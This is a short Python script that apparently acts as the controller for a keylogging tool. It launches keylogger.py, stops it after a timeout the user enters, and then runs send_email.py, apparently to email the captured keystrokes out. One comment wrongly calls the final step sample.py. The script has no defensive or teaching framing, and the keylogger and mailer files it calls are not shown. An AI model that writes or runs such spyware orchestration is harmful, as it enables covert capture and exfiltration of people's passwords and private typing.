import subprocess
import time

# Execute keylogging.py
process_keylogger = subprocess.Popen(["python3", "keylogger.py"])

# Get timeout value from the user
timeout = int(input("Enter the timeout value in seconds: "))

# Wait for the specified period
try:
    process_keylogger.wait(timeout=timeout)
except subprocess.TimeoutExpired:
    # If the timeout expires, terminate the keylogging process
    process_keylogger.terminate()

# Execute sample.py
subprocess.run(["python3", "send_email.py"])
